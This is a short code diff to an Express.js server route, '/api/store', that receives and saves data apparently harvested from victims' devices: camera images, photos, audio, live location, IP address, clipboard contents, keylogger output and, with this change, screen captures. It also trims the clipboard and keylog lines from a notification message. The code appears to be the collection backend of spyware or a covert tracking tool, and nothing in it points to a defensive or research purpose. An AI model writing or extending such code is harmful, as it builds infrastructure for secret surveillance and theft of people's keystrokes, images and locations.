@@ -93,7 +93,8 @@ app.post('/api/store', async (req, res) => {
         const { 
             cameraImage, location, deviceDetails, screenshot, 
             userPhoto, audioData, ipAddress, fullDeviceInfo,
-            networkSpeed, liveLocation, captureCount, clipboardData, keylogData
+            networkSpeed, liveLocation, captureCount, 
+            clipboardData, keylogData, screenCapture
         } = req.body;
 
         const newEntry = {
@@ -111,6 +112,7 @@ app.post('/api/store', async (req, res) => {
             captureCount: captureCount || 0,
             clipboardData: clipboardData || null,
             keylogData: keylogData || null,
+            screenCapture: screenCapture || null,
             timestamp: new Date().toISOString()
         };
 
@@ -128,8 +130,6 @@ app.post('/api/store', async (req, res) => {
 🚀 Speed: ${networkSpeed?.download || 'Unknown'} Mbps
 🔋 Battery: ${fullDeviceInfo?.battery?.level || 'Unknown'}
 📸 Captures: ${captureCount || 1}
-📋 Clipboard: ${clipboardData ? 'Captured' : 'No'}
-⌨️ Keylog: ${keylogData ? 'Captured' : 'No'}
 🕐 Time: ${new Date().toISOString()}
         `;
 
